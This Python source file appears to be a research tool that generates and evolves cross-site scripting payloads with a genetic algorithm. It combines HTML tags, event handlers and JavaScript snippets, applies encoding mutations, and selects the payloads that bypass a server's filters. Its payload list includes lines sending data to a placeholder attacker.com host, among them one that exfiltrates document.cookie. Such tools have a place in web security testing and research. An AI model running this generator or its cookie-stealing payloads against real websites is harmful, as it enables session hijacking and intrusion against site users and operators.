"""
GAXSS Payload Generator (Generic)
Generates context-aware XSS payloads based on DNA encoding

CORRECTED GA PHILOSOPHY VERSION
- NO mutation blocking - let GA explore all possibilities freely
- Mutations provide diversity (HTML encoding, URL encoding, Base64, etc.)
- Fitness calculator evaluates which payloads work based on SERVER RESPONSE
- Natural selection will favor payloads that bypass filters
"""

import random
from typing import List, Optional
import logging

logger = logging.getLogger('PayloadGenerator')


class PayloadComponentLibrary:
    """Library of payload components for XSS attacks per paper Table 5-7."""

    TAGS = [
        'img', 'svg', 'script', 'body', 'iframe', 'embed', 'object', 'video', 'audio',
        'details', 'input', 'button', 'marquee', 'meta', 'link'
    ]  # 15 tags per paper

    EVENTS = [
        'onerror', 'onload', 'onclick', 'onmouseover', 'onmouseenter', 'onkeydown',
        'onchange', 'onfocus', 'onblur', 'ondrag', 'onwheel', 'ontouchstart', 'onpaste',
        'oncontextmenu', 'onmousemove'
    ]  # 15 events per paper

    JSCODE = [
        'alert(1)', 'alert(document.domain)', 'console.log(1)', 'fetch("http://attacker.com")',
        'document.location="http://attacker.com"', 'new Image().src="http://attacker.com?c="+document.cookie',
        'XMLHttpRequest', 'document.write(1)', 'throw new Error(1)', 'setInterval(function(){},0)',
        'setTimeout(alert,0,1)', 'Function("alert(1)")()', 'eval("alert(1)")'
    ]  # 13 JS payloads

    CLOSING_TAGS = ['', '>', '</tag>', 'alert(1)', '', 'alert(1)']  # 6 options


class GAXSS_PayloadGenerator:
    """Generate context-aware XSS payloads from DNA encoding.
    
    GA PHILOSOPHY: 
    - Generate diverse payloads with ALL mutation types
    - Let fitness calculator evaluate effectiveness
    - Natural selection will converge to optimal payloads
    """

    CONTEXT_SCRIPT = 0
    CONTEXT_ATTRIBUTE = 1
    CONTEXT_OUTSIDE = 2

    def __init__(self, test_func=None, param_name: str = "search"):
        """Initialize payload generator.
        
        Args:
            test_func: Optional function for context detection
            param_name: Parameter name for context analysis
        """
        self.library = PayloadComponentLibrary()
        self.generated_count = 0
        self.mutation_success_rate = 0.0
        
        # Context analyzer (optional) - FIX #2
        self.context_analyzer = None
        if test_func:
            try:
                from parameter_context_analyzer import ParameterContextAnalyzer
                self.context_analyzer = ParameterContextAnalyzer(test_func, param_name)
                logger.info(f"[OK] Context analyzer initialized for param '{param_name}'")
            except Exception as e:
                logger.warning(f"Could not initialize context analyzer: {e}")
        
        logger.info("PayloadGenerator initialized with GA philosophy - All mutations enabled")

    def is_well_formed(self, payload: str) -> bool:
        """Check if payload is syntactically valid.
        
        Only checks basic syntax, NOT executability.
        Executability is determined by fitness calculator based on response.
        """
        # Check 1: Balanced brackets
        open_brackets = payload.count('<')
        close_brackets = payload.count('>')
        bracket_diff = abs(open_brackets - close_brackets)
        if bracket_diff > 2:  # allow some mismatch for open contexts
            logger.debug(f"Failed bracket imbalance: {bracket_diff}")
            return False

        # Check 2: Balanced double quotes
        double_quotes = payload.count('"')
        if double_quotes % 2 != 0:
            logger.debug(f"Failed odd double quotes: {double_quotes}")
            return False

        # Check 3: Balanced single quotes
        single_quotes = payload.count("'")
        if single_quotes % 2 != 0:
            logger.debug(f"Failed odd single quotes: {single_quotes}")
            return False

        # Check 4: No consecutive delimiters
        forbidden_patterns = ['""', "''", '><']
        for pattern in forbidden_patterns:
            if pattern in payload:
                logger.debug(f"Failed forbidden pattern: {pattern}")
                return False

        return True

    def apply_safe_mutations(self, payload: str, dna) -> str:
        """Apply mutations while maintaining syntactic validity.
        
        GA PHILOSOPHY:
        - Apply ALL mutations from DNA (no filtering)
        - Only skip if mutation breaks syntax (well-formed check)
        - Do NOT judge executability here - that's fitness calculator's job
        """
        if not dna.mutations:
            logger.debug("No mutations to apply")
            return payload

        mutated = payload
        mutations_applied = 0

        for mutation_idx in dna.mutations:
            try:
                from ga_core import GAXSS_Mutations
                candidate = GAXSS_Mutations.apply_mutation(mutated, mutation_idx)

                if self.is_well_formed(candidate):
                    mutated = candidate
                    mutations_applied += 1
                    logger.debug(f"Applied mutation {mutation_idx}: {candidate[:50]}...")
                else:
                    logger.debug(f"Skipped mutation {mutation_idx} (malformed syntax)")
            except Exception as e:
                logger.warning(f"Mutation {mutation_idx} failed: {e}")
                continue

        if len(dna.mutations) > 0:
            self.mutation_success_rate = mutations_applied / len(dna.mutations)
            logger.debug(
                f"Mutation summary: {mutations_applied}/{len(dna.mutations)} applied "
                f"(success rate: {self.mutation_success_rate:.2%})"
            )

        return mutated

    def generate_payload_type1(self, dna) -> str:
        """Generate Type 1 payload: Code between script tags.
        
        Context: Code inside <script>...</script>
        Format: malicious_code
        Example:
            Original: <script> var x = USER_INPUT </script>
            Result:   <script> var x = alert(1) </script>
        """
        jscode = self.library.JSCODE[dna.main[2] % len(self.library.JSCODE)]
        payload = f"{jscode}"
        logger.debug(f"Type1 base: {payload}")
        payload = self.apply_safe_mutations(payload, dna)
        logger.debug(f"Type1 final: {payload}")
        return payload

    def generate_payload_type2(self, dna) -> str:
        """Generate Type 2 payload: Code in event attribute.
        
        Context: Code in event handler attribute
        Format: event="code"
        Example:
            Original: <input value="USER_INPUT">
            Result:   <input value="" onclick="alert(1)" data="">
        """
        closing = self.library.CLOSING_TAGS[dna.closing[0] % len(self.library.CLOSING_TAGS)]
        event = self.library.EVENTS[dna.main[1] % len(self.library.EVENTS)]
        jscode = self.library.JSCODE[dna.main[2] % len(self.library.JSCODE)]
        
        payload = f'{closing} {event}="{jscode}" x'
        logger.debug(f"Type2 base: {payload}")
        payload = self.apply_safe_mutations(payload, dna)
        logger.debug(f"Type2 final: {payload}")
        return payload

    def generate_payload_type3(self, dna) -> str:
        """Generate Type 3 payload: New HTML tag injection.
        
        Context: Inject new HTML tag with event handler
        Format: <tag event="code">
        Example:
            Original: <p>USER_INPUT</p>
            Result:   <p><img onerror="alert(1)"></p>
        """
        tag = self.library.TAGS[dna.main[0] % len(self.library.TAGS)]
        event = self.library.EVENTS[dna.main[1] % len(self.library.EVENTS)]
        jscode = self.library.JSCODE[dna.main[2] % len(self.library.JSCODE)]
        
        payload = f'<{tag} {event}="{jscode}">'
        logger.debug(f"Type3 base: {payload}")
        payload = self.apply_safe_mutations(payload, dna)
        logger.debug(f"Type3 final: {payload}")
        return payload

    def select_context_for_payload(self, dna) -> int:
        """Select optimal context based on DNA.
        
        Uses DNA to make deterministic choice (reproducible).
        
        Args:
            dna: DNA containing selection seed
            
        Returns:
            Int: Context type (0, 1, or 2)
        """
        context = dna.main[5] % 3
        return context

    def generate_payload(self, dna, context: Optional[int] = None) -> str:
        """Generate XSS payload from DNA encoding.
        
        GA PHILOSOPHY:
        - Generate payload with all mutations applied
        - Do NOT filter based on executability
        - Let fitness calculator evaluate effectiveness
        
        Args:
            dna: DNA encoding with all payload parameters
            context: Optional context override (0/1/2). If None, selects from DNA
            
        Returns:
            String: Generated XSS payload
        """
        if context is None:
            context = self.select_context_for_payload(dna)

        if context < 0 or context > 2:
            raise ValueError(f"Invalid context: {context}. Must be 0-2")

        if context == self.CONTEXT_SCRIPT:
            payload = self.generate_payload_type1(dna)
        elif context == self.CONTEXT_ATTRIBUTE:
            payload = self.generate_payload_type2(dna)
        else:  # CONTEXT_OUTSIDE
            payload = self.generate_payload_type3(dna)

        self.generated_count += 1
        logger.info(
            f"Generated payload #{self.generated_count}: "
            f"context={context}, len={len(payload)}, "
            f"mutations={len(dna.mutations)}"
        )
        return payload

    def generate_payload_batch(self, dna_list: List, context: Optional[int] = None) -> List[str]:
        """Generate multiple payloads from DNA list.
        
        Args:
            dna_list: List of DNA objects
            context: Optional context for all payloads
            
        Returns:
            List of generated payloads
        """
        payloads = []
        for dna in dna_list:
            payload = self.generate_payload(dna, context)
            payloads.append(payload)
        return payloads

    def get_stats(self) -> dict:
        """Get generation statistics."""
        return {
            'total_generated': self.generated_count,
            'mutation_success_rate': self.mutation_success_rate,
            'ga_philosophy': 'All mutations enabled - natural selection in action',
        }